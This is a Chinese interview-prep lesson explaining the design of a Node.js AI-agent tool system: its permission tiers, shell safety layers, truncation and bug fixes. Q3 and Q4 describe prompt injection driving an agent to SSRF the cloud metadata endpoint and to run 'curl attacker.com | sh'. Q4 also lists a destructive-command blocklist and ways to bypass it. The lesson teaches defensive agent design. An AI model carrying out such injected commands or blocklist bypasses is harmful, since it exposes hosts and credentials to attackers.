# lesson04 · 高杠杆核心工具 —— 面试题讲解（Node 版）

> 10 题，三层深度。每题按固定结构展开：**考点 → 答题结构 → 参考话术 → 代码锚点 → 常见追问**。
> 本课可引用的"证据"：6 个核心工具、390 行新增代码（`tools/` 262 行 + `core_tools.js` 128 行）、11 个框架文件与第 3 章逐字节相同、19 个离线用例、两段真实模型运行输出（一次撞权限墙后自主换工具，一次 danger 级确认后真的执行了 grep）。

使用建议：T1 三题必须脱口而出；T2 要能讲"我踩过 / 我这么修"；T3 直接对标"0→1 方案设计"。

## T1 基础原理（必过线）

### Q1：真实 Agent 的工具为什么收敛到 6 个，而不是给每种操作配一个工具？

- **考点**：工具集设计的第一性判断——杠杆率而不是数量。

- **答题结构**：给出判断标准（杠杆率）→ 三类元能力分层 → 工具多的代价 → 落到本课代码。

- **参考话术**："我按杠杆率选工具：一个工具能撬动多少能力，除以它占掉的 schema 复杂度。本课的 6 个分三层：3 个 read（读文件、列目录、搜内容）是感知，2 个 write（写文件、联网）产生改动，1 个 danger（跑 shell）是万能执行。`run_shell` 杠杆率最高，shell 图灵完备，模型现场拼 `grep | sort | uniq -c` 就能出统计，我不用为每种加工预制工具。工具多的代价很实：每多一个工具，schema 多占一份 prompt token，模型在多选里挑错的概率涨一分，而且每个工具都要单独写校验和错误处理。第 2 章那两个玩具工具（`get_weather`、`search_logs`）就是反面样本，各覆盖一个写死的场景，用户第一句话就能超出它们。"

- **代码锚点**：`core_tools.js` 第 24、40、56、76、93、109 行是六次 `r.register(...)` 的起点，每个的第三个参数就是等级；第 21 行 `buildCoreTools(confirm = null)` 是统一的装配入口。

- **常见追问**：*6 个真够用吗？* → 覆盖"代码库分析"这一类任务够用。真实业务还要接业务系统（第 9 章的 MCP）、长期知识（第 5 章记忆）、任务委派（第 6 章多 Agent）。工具清单由任务域决定，制造业 Agent 的核心工具是 ERP/MES 接入加知识检索，不是 shell。

### Q2：一次工具调用在你这套框架里过了哪几道门？

- **考点**：执行流水线的完整性和顺序——这是最容易讲漏顺序的一题。

- **答题结构**：六步顺序 + 每步对应的错误码 → 为什么是这个顺序 → 确认的三态返回值。

- **参考话术**："六步，都在 `registry_full.js` 第 46 行的 `execute(name, argumentsStr)` 里：查表（不存在 → `TOOL_NOT_FOUND`）→ 解参数 JSON（失败 → `INVALID_PARAMS`）→ 权限门（拒绝 → `PERMISSION_DENIED`）→ 按工具自己声明的 schema 校验参数（带宽容转换，模型的 `"3"` 能收成 `3`）→ 执行（try/catch 全隔离）→ 返回 `{result}` 或 `{error:{code, message, retryable}}`。每一步的错误都是一条模型读得懂的消息，不是堆栈。顺序有意为之：权限在参数校验之前，权限答的是'能不能做'，校验答的是'参数对不对'，先答前者，模型就不会在无权工具上白改三轮参数。确认回调返回三个值：`true` 放行这次，`"always"` 放行并记进会话 allowlist，`false`（含其他任何输入）拒绝——拒绝在无确认通道时是默认值，后台 Agent 不该因为没人应答就放行。"

- **代码锚点**：`registry_full.js` 第 46-83 行（六步依次是 47、51、59、67、75、80 起）；`permissions.js` 第 50-71 行是三态决策；`errors.js` 第 10-17 行是错误码表，第 25-45 行 `ToolError.toResult()` 负责把错误转成给模型的结果。

- **常见追问**：*参数校验为什么用宽容转换而不是直接拒？* → 模型把整数写成 `"3"`、`3.0` 是常态，能无损转就转，转不了才报错。校验层的目标是让调用成功，不是证明模型错了。

### Q3：`fetch_url` 是个 GET，凭什么归 write 级、要用户确认？

- **考点**：权限分级依据——风险还是语义。这题最能区分"懂安全"和"背规则"。

- **答题结构**：先给原则（按风险）→ 三个写侧风险 → 收回到代码 → 追问里给生产加固。

- **参考话术**："因为权限分级看的是这个工具能造成的最大危害，不是它名字里有没有'写'。GET 有三类写侧风险：一是副作用，一次 GET 也可能触发后端逻辑，改计数器、触发爬虫告警；二是 SSRF，提示注入可以诱导 Agent 去请求 `http://169.254.169.254/latest/meta-data/` 拿云厂商临时凭证，或者打内网服务端口，这是真实发生过的 Agent 事故类型；三是配额和费用，很多第三方接口按次收费。所以联网就算 GET 也归 write，比本地读文件风险高。这条原则我还在别处用过：同一个纯函数 `runShell` 换个宿主就能换等级，CI 里自动放行、生产里强制确认，等级是宿主的声明，不是实现的属性。"

- **代码锚点**：`core_tools.js` 第 93-107 行（`fetch_url` 注册，第 106 行写 `"write"`）；`tools/fetch.js` 第 16-22 行是唯一实现；`permissions.js` 第 16-20 行的 `Kind` 三档定义里，write 的注释写的是"有副作用可逆 → 用户确认"。

- **常见追问**：*那干脆禁掉联网工具？* → 禁掉就丢了查在线文档的能力。分级加确认是"可用性对风险"的折中；生产还要补网络出向白名单和请求域名白名单，这两件事本课没做（缺口表里有）。

## T2 工程深度（区分度所在）

### Q4：`run_shell` 的五层安全分别防什么？黑名单能绕过吗？

- **考点**：安全分层认知，以及敢不敢认自己实现的边界。

- **答题结构**：五层逐条 → 明确指出黑名单的定位 → 主动交代沙箱缺席。

- **参考话术**："五层：① 命令黑名单，执行前正则拦截 `rm -rf`、`shutdown`、`mkfs`、fork bomb 这类破坏性命令；② 超时，`exec` 的 `timeout` 选项，防死循环和长任务占死进程；③ 输出上限，`maxBuffer` 1MB，防 `cat /dev/zero` 之类撑爆 Node 内存；④ 权限分级，注册成 danger 级，执行前人工确认；⑤ 沙箱，OS 级隔离。黑名单会被绕过，这一点我写在文档里也不回避：`rm -fr`、`find . -delete`、`python3 -c 'import shutil...'`、base64 编码后解码执行，正则永远追不上变体。所以它的定位是防呆，挡的是模型幻觉出来的危险命令，不是挡攻击者。真正的边界是第 ⑤ 层，`child_process` 不是隔离容器，本课只在文件头注释里写明了这条边界，没实现——填它需要的不是几十行代码，是一整套部署形态（容器镜像、网络策略、密钥管理）。"

- **代码锚点**：`tools/shell.js` 第 20-27 行黑名单、第 37-46 行拦截逻辑、第 50-52 行 `timeout` 与 `maxBuffer`、第 54-64 行 `err.killed` 转成 `timeout` 标记；第 13-14 行的沙箱注释；`core_tools.js` 第 109-124 行注册为 danger；`agent.js` 第 111 行是框架层截断。

- **常见追问**：*prompt injection 让模型执行 `curl attacker.com | sh`，你怎么办？* → 黑名单拦不住（它不在名单里），靠沙箱把破坏半径锁在容器内，再加网络出向白名单、密钥绝不进沙箱环境变量、最小权限用户运行。面试要主动说这条边界，含糊其辞反而是减分项。

### Q5：工具返回超大结果怎么办？

- **考点**：工具设计要"感知上下文预算"，这是 Agent 区别于普通脚本的地方。

- **答题结构**：两道截断（工具内 + 框架层）→ hint 的作用 → head+tail 的理由 → 根治方案。

- **参考话术**："两道截断加一条根治。第一道在工具内：`read_file` 超过 50KB 只回头 2000 字符加一条 hint，`fetch_url` 超 2MB 只回前 2000 字符。hint 不是错误，是给模型的行动建议——它写了'文件过大，请使用 run_shell 的 head/sed 分页读取'，模型下一轮会自己改成 `head -100`，这比硬截断后让它猜要好。第二道在框架层：所有工具结果回填进上下文之前过 `truncateToolResult`，按 token 截到 1000，保留头尾。为什么留尾：日志的尾部和 JSON 的结尾是最新状态和结论，只留头会丢掉'最后发生了什么'。根治方案是结果落盘、上下文里只放文件路径加首尾摘要，模型要看细节再分段读——'放到外面'比'少放一点'彻底，那是第 5 章记忆的思路。"

- **代码锚点**：`tools/filesystem.js` 第 19-26 行（50KB 阈值与 hint）；`tools/fetch.js` 第 23-30 行（2MB 判断与两段 `slice`）；`context_manager_v2.js` 第 21 行 `MAX_TOOL_RESULT_TOKENS = 1000`、第 28-37 行截断实现；`agent.js` 第 111 行是调用点。

- **常见追问**：*`fetch_url` 的截断有什么问题？* → 判断时机不对：它先 `await resp.text()` 把整个 body 读进内存，再判断有没有超 2MB（第 23 行）。200MB 的响应会先落在内存里。彻底修要流式读取边读边计数，第 13 章讲流式时做。

### Q6：交互式多轮是怎么实现的？`/reset` 为什么能一键失忆？

- **考点**：上下文生命周期管理，以及依赖注入带来的红利。

- **答题结构**：机制（一个 cm 跨轮复用）→ 有哪两个东西跨轮存活 → `/reset` 的真相 → 分层（UI vs 逻辑）。

- **参考话术**："多轮记忆没有魔法，就是跨轮复用同一个上下文管理器。`main.js` 里 `while(true)` 每轮调 `agent.run(line)`，`run` 往同一个 `cm` 追加消息，下一轮 `cm.build()` 出来就带着全部历史。跨轮活下来的只有两个东西：那个 `cm`，和注册一次复用的 `registry`。`/reset` 能一键失忆，是因为 Agent 对 `cm` 是引用依赖，重置就是 `agent.cm = 新 cm` 这么一个赋值，`agent.js` 一行都不用改——这是第 2 章选择依赖注入而不是模块级单例的兑现。分工上也干净：`Agent.run()` 是一次交互的完整单元，`repl()` 的 while 循环管会话，换 UI（终端、IM、Web）只换这一层。"

- **代码锚点**：`main.js` 第 66-107 行 `repl()`，第 67-69 行装配，第 89-93 行 `/reset` 换引用，第 85-87 行 `/budget` 打印账本，第 29-34 行 `cliConfirm` 接三态确认；`agent.js` 第 52-53 行 `run` 与 `cm.append`；`context_manager_v2.js` 第 56 行水位线、第 70 行 `append`、第 90 行 `needsCompaction`。

- **常见追问**：*多用户场景怎么办？* → 每个用户一条会话，各自一个 `cm`，`/reset` 只影响自己那一份。会话持久化和每用户会话分别是第 10、11 章的事。当前实现里 `cm` 只在进程内存活，关掉进程就没了，这是明确的缺口。

### Q7：工具实现和工具注册为什么要分开？

- **考点**：关注点分离，以及它在测试和维护上的实际收益。

- **答题结构**：两层各是什么 → 四点收益 → 拿证据坐实 → 换实现的例子。

- **参考话术**："`tools/*.js` 是纯函数：给参数、返回对象，不碰 Function Calling 协议、不知道权限、不知道校验。`core_tools.js` 是翻译层，把纯函数包成 `{name, description, params, fn}` 并声明等级。四点收益：工具函数能脱离 Agent 单测，本课 19 个用例里有 12 个直接调纯函数（`test.js:21` 到 `test.js:106`），一次 LLM 都没起；换协议只改翻译层，明天要接 MCP 的工具描述，四个实现一个字不动；所有 description 集中在一个文件，调提示词效果只改一处；权限是声明式的，`register(tool, "danger")` 第二个参数就定了等级，策略和实现解耦。证据不是我说了算：本课 11 个继承文件与第 3 章逐字节相同，`diff` 出空结果，换掉全部工具没碰过框架。"

- **代码锚点**：`core_tools.js` 第 21-22 行建注册表、第 24-38 行一个完整注册（描述、schema、纯函数、等级四件套）；`registry_full.js` 第 33 行 `register(toolDef, kind = "read")` 是等级落点；`test.js` 第 21-106 行是直接调纯函数的用例；`tools/search.js` 第 28 行是冻结的签名。

- **常见追问**：*搜索生产上怎么换成 ripgrep？* → `exec("rg ...")` 换掉 `walk` 的实现，`searchFiles(pattern, {dir, fileGlob, limit})` 签名不变，上层完全无感。教学版不读 `.gitignore`、单线程、无二进制保护，大仓库会慢且吵，但接口不用跟着变。

## T3 架构设计（对标岗位"0→1 方案设计"）

### Q8："工具是数据，框架是骨架"——你怎么衡量一个 Agent 架构的好坏？

- **考点**：架构判断力，以及能不能用自己项目的数字说话。

- **答题结构**：给一条可检验的标准 → 本课证据 → 推论（未来的改动成本）→ 反例（什么时候该改主循环）。

- **参考话术**："标准就一条：加一个新能力，是加一行注册，还是改主循环？本课是前者的样本。能力从'2 个玩具工具'换成'6 个真实工具加权限门'，新增 5 个文件 390 行，11 个框架文件与上一章逐字节相同，主循环只动了一处而且是修 bug 不是加功能。加 `fetch_url` 这个动作的全部内容是：新建 `tools/fetch.js` 35 行，在 `core_tools.js` 里加一段 `register`。推论也清楚：哪天要把 Function Calling 换成 MCP 的工具描述，改的是翻译层那 128 行，四个实现和主循环都不用动。反过来，什么时候必须动主循环？当新能力的语义和'一轮推理一轮工具'不一样的时候——委派子 Agent 要管生命周期，流式输出要接 chunk 回调，那类改动在第 6、13 章。"

- **代码锚点**：`core_tools.js` 第 21 行是唯一装配入口；`agent.js` 第 64 行 `this.llm(this.cm.build(), this.registry.getSchemas())` 和第 97 行 `this.registry.execute(...)` 说明主循环只依赖注册表的两个接口；`registry_full.js` 第 33 行是扩展点。

- **常见追问**：*这套抽象有没有漏？* → 有。`permissions.js` 第 51 行给未声明等级的工具默认 read，是 fail-open：新注册路径一多（子 Agent、插件、MCP 动态注册）就会把忘写等级的工具自动放行。`test.js` 第 139 行把这条缺口钉成了负向用例，等哪一课收口它就会变红。

### Q9：这份代码里有 bug 吗？说说你是怎么发现和修的。

- **考点**：工程严谨性。背八股的人讲不出具体症状和定位过程，真写过的人能。

- **答题结构**：挑两个同族的 + 一个孤立的 → 每个讲症状、根因、修法、回归用例 → 收一句方法论。

- **参考话术**："三个，两个是同一族：孤儿 `tool_calls` 导致 API 400。第一个在压缩：切点按位置切会拆散 `assistant(tool_calls)` 和它后面的 `tool` 结果，上一轮请求里就有 `tool` 消息前面没有 `tool_calls`，服务端直接拒。触发概率很低，得压缩触发和切点巧合同时成立。修法是切点前移，`while (recent[split]?.role === "tool") split -= 1`，保证留下的第一条不是 tool 消息。第二个在这一课的死循环检测：原来判定死循环后 `break`，跳过这一轮剩下的工具调用——可那条带 N 个 `tool_calls` 的 assistant 消息已经进上下文了，剩下几条再也拿不到回填，下一轮配对数量对不上，同样是 400。改成 `continue`，剩余调用不执行但仍逐条回填一条 `LOOP_DETECTED` 错误。第三个是 glob 的转义顺序：先把每段转义、再对整串把 `?` 换成 `.`，结果 `?` 已经被转义成 `\?`，再替换得到 `\.`，`fileGlob: "app.j?"` 永远命不中 `app.js`。实测返回 `count: 0`，改成先按 `*` 切段、段内按 `?` 切开再逐块转义。三个都补了回归用例，我还把修复逐一还原后重跑过，确实是对应用例失败、其余通过。"

- **代码锚点**：`context_manager_v2.js` 第 101-108 行 + `test.js:207`；`agent.js` 第 69-96 行 + `test.js:237`；`tools/search.js` 第 88-93 行 + `test.js:98`。

- **常见追问**：*你怎么保证这些不再回归？* → 用例钉在同一个 `test.js` 里，`npm test` 19 个用例全绿；压缩那条是从上一章继承过来的跨章回归用例，换章节也不丢。另外这类 bug 的共同点是"本地看不出来、传到服务端才报错"，所以我给框架定了一条不变式：发出去的请求必须自己先校验一遍配对完整性，不能只靠服务端的 400 来发现问题。

### Q10：把这套工具系统接进生产多租户环境，你会改什么？

- **考点**：生产化视野（对标"技术负责人"职责）。

- **答题结构**：四层改造（安全/可扩展/可观测/成本体验）→ 每层给具体的下一步 → 明确哪些是当前缺口。

- **参考话术**："分四层。安全：每个租户独立沙箱，网络出向白名单，密钥绝不进沙箱环境变量；shell 从黑名单升级成命令解析加白名单，或者干脆只在预置镜像里跑；`fetch_url` 加域名白名单挡 SSRF。可扩展：工具注册从代码里的 `register` 换成配置声明加目录扫描，各业务线自己贡献工具不动框架，同时把 MCP 兼容做好让外部工具热插拔；顺手把 `permissions.js` 第 51 行的 fail-open 改成 fail-closed，未知等级默认拒。审计：每次工具调用落结构化日志——哪个租户、什么工具、什么参数、谁批的，这层可以借第 8 章的 hooks 做审计插件；观测：`budget()` 的账本进监控，耗时与 token 成本按租户核算，两者口径分开。成本和体验：工具结果落盘按需读、只读工具并行调用、流式输出、用户能中途打断——最后这条当前 REPL 不支持，是明确缺口。排序上我会先做安全加可观测，因为它们决定敢不敢接真实业务。"

- **代码锚点**：`permissions.js` 第 51 行（fail-open 缺口）；`tools/shell.js` 第 13-14 行（沙箱注释，本课只注明未实现）；`tools/fetch.js` 第 23 行（截断时机缺口）；`test.js` 第 139 行（缺口被负向用例钉住）；README 的缺口表是这四层的清单来源。

- **常见追问**：*资源只有两个人，先做哪一步？* → 先沙箱加审计日志。沙箱解决"敢不敢让它跑真命令"，审计解决"出事后答得出发生了什么"，多租户和工具市场是规模化收益，没有这两步就是放大器。
